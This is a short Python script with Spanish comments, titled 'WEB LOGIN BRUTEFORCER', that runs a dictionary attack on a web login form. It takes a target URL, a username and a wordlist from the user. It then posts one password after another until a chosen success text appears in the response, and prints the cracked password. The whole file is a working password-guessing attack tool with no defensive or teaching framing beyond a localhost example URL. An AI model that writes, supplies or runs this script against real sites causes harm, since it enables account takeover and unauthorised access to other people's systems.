import requests
import sys
import os

def brute_force_login(url, username, wordlist_path, user_field='username', pass_field='password', success_indicator='Welcome'):
    """
    Realiza un ataque de fuerza bruta contra un formulario de login.
    """
    if not os.path.exists(wordlist_path):
        print(f"Error: No se encontró el archivo {wordlist_path}")
        return None

    # Iniciamos una sesión para manejar cookies automáticamente
    session = requests.Session()

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                # Preparamos los datos del formulario
                payload = {
                    user_field: username,
                    pass_field: password
                }

                # Enviamos la petición POST
                print(f"[*] Probando: {password}", end='\r')
                response = session.post(url, data=payload, timeout=5)

                # Verificamos si el login fue exitoso
                # Esto puede variar: buscar texto específico, cambio de URL, etc.
                if success_indicator in response.text:
                    print(f"\n[+] ¡ÉXITO! Contraseña encontrada: {password}")
                    return password

        print("\n[-] No se encontró la contraseña en el diccionario.")
        return None

    except requests.exceptions.RequestException as e:
        print(f"\nError de conexión: {e}")
        return None

if __name__ == "__main__":
    print("-" * 50)
    print("WEB LOGIN BRUTEFORCER")
    print("-" * 50)

    target_url = input("URL del Login (ej: http://localhost:5000/login): ").strip()
    target_user = input("Nombre de usuario: ").strip()
    w_path = input("Ruta a la wordlist: ").strip()
    
    # Parámetros avanzados (opcionales)
    u_field = input("Nombre del campo usuario [defecto 'username']: ") or 'username'
    p_field = input("Nombre del campo password [defecto 'password']: ") or 'password'
    indicator = input("Texto de éxito (ej: Welcome, Dashboard, Logout): ") or 'Welcome'

    print(f"\nIniciando ataque sobre {target_url} para el usuario '{target_user}'...")
    brute_force_login(target_url, target_user, w_path, u_field, p_field, indicator)
